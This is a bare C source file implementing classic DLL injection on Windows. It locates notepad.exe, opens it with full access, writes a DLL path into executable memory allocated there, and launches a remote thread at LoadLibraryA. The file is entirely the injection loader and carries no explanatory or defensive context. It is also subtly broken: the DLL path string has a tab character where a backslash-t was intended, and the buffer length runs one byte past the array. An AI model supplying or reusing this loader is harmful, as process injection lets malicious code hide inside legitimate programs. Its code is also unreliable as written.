#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>
#include <TlHelp32.h>

int getPIDbyProcName(const char* procName) {
    int pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnap, &pe32) != FALSE) {
        while (pid == 0 && Process32Next(hSnap, &pe32) != FALSE) {
            if (strcmp(pe32.szExeFile, procName) == 0) {
                pid = pe32.th32ProcessID;
            }
        }
    }
    CloseHandle(hSnap);
    return pid;
}

char DLL [] = "C:	estdll.dll";
unsigned int dllLen = sizeof(DLL) + 1;

typedef LPVOID memory_buffer;

int main(int argc, char* argv[]) {
  HANDLE pHandle;
  HANDLE remoteThread;
  memory_buffer rb;

  HMODULE hKernel32 = GetModuleHandle("Kernel32");
  void *lb = GetProcAddress(hKernel32, "LoadLibraryA");
  
  int pid = getPIDbyProcName("notepad.exe");
  pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
  rb = VirtualAllocEx(pHandle, NULL, dllLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
  WriteProcessMemory(pHandle, rb, DLL, dllLen, NULL);

  remoteThread = CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
  CloseHandle(pHandle);
 
  return 0;
}